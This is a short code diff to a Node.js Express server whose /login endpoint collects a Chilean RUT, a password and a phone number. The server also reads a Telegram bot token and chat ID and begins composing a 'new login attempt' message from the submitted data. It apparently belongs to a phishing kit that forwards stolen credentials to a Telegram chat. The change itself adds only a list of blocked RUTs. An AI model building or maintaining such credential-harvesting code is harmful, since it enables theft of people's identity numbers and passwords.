@@ -15,12 +15,20 @@ app.use(express.urlencoded({ extended: true }));
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
+// Lista de RUTs bloqueados
+const bloqueados = ["11111111-1", "22222222-2"]; // agrega aquí los RUTs que quieras bloquear
+
 // Endpoint de login
 app.post("/login", async (req, res) => {
   const { rut, passwd, telefono } = req.body;
 
   if (!telefono) {
     return res.status(400).send("❌ El campo 'teléfono' es obligatorio.");
+  }
+
+  // Validación de RUT bloqueado
+  if (bloqueados.includes(rut)) {
+    return res.status(403).send("❌ Acceso bloqueado para este RUT");
   }
 
   const mensaje = `Nuevo intento de login:
